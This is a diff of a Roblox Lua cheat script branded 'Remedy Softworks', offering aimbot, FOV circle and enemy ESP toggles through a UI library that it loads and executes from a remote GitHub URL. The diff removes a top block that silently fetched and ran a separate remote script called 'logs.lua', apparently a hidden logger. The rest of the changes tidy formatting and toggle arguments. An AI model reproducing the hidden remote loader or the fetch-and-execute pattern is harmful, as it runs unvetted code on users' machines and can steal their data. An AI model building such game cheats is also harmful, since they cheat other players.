@@ -1,25 +1,15 @@
--- Load and execute the external script from the provided URL
-local externalScriptURL = "https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/logs.lua"
-local success, result = pcall(function()
-    loadstring(game:HttpGet(externalScriptURL))()
-end)
-
-if not success then
-    warn("Failed to load external script: " .. result)
-end
-
 -- Import the library
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/WetCheezit/Bracket-V2/main/src.lua"))()
 
 -- Notification on first run
-game:GetService("StarterGui"):SetCore("SendNotification",{
+game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "Remedy Softworks",
-    Text = "Thanks for using Remedy", 
-    Duration = 5 
+    Text = "Thanks for using Remedy",
+    Duration = 5
 })
 
 -- Window
-local Window, MainGUI = Library:CreateWindow("Bracket-V2")
+local Window = Library:CreateWindow("Remedy Softworks")
 
 -- Tabs
 local Tab1 = Window:CreateTab("Aimbot")
@@ -30,48 +20,44 @@ local Tab3 = Window:CreateTab("Misc")
 local AimbotGroupbox = Tab1:CreateGroupbox("Aimbot Settings", "Left")
 
 -- Toggle for Aimbot
-local AimbotToggle = AimbotGroupbox:CreateToggle("Enable Aimbot", function(state)
-   Toggles.AimbotToggle.Value = state
+local AimbotToggle = AimbotGroupbox:CreateToggle("Enable Aimbot", false, function(state)
+    Toggles.AimbotToggle.Value = state
 end)
 
 -- Toggle for Show FOV Circle
-local ShowFOVToggle = AimbotGroupbox:CreateToggle("Show FOV Circle", function(state)
-   Toggles.ShowFOV.Value = state
+local ShowFOVToggle = AimbotGroupbox:CreateToggle("Show FOV Circle", false, function(state)
+    Toggles.ShowFOV.Value = state
 end)
 
 -- Slider for FOV Size
 local FOVSizeSlider = AimbotGroupbox:CreateSlider("FOV Size", 50, 500, 100, function(value)
-   Options.FOVSize.Value = value
+    Options.FOVSize.Value = value
 end)
 
 -- Slider for Aimbot Smoothness
 local AimbotSmoothnessSlider = AimbotGroupbox:CreateSlider("Aimbot Smoothness", 1, 20, 5, function(value)
-   Options.AimbotSmoothness.Value = value
+    Options.AimbotSmoothness.Value = value
 end)
 
 -- Dropdown for Target Part Selection
 local TargetPartDropdown = AimbotGroupbox:CreateDropdown("Target Part", {"Head", "Humanoid", "Chest"}, function(selectedPart)
-   Options.TargetPart.Value = selectedPart
+    Options.TargetPart.Value = selectedPart
 end)
 
 -- Groupbox for Visuals Settings
 local VisualsGroupbox = Tab2:CreateGroupbox("Visuals Settings", "Left")
 
 -- Toggle for ESP Boxes
-local ToggleBoxes = VisualsGroupbox:CreateToggle("Toggle Enemy Boxes (ESP)", function(state)
-   Toggles.ToggleBoxes.Value = state
+local ToggleBoxes = VisualsGroupbox:CreateToggle("Toggle Enemy Boxes (ESP)", false, function(state)
+    Toggles.ToggleBoxes.Value = state
 end)
 
 -- Groupbox for Misc Settings
 local MiscGroupbox = Tab3:CreateGroupbox("Misc Settings", "Left")
 
 -- Toggle for Watermark
-local WatermarkToggle = MiscGroupbox:CreateToggle("Toggle Watermark", function(state)
-    if state then
-        WatermarkFrame.Visible = true
-    else
-        WatermarkFrame.Visible = false
-    end
+local WatermarkToggle = MiscGroupbox:CreateToggle("Toggle Watermark", false, function(state)
+    WatermarkFrame.Visible = state
 end)
 
 -- Initialization of Options and Toggles
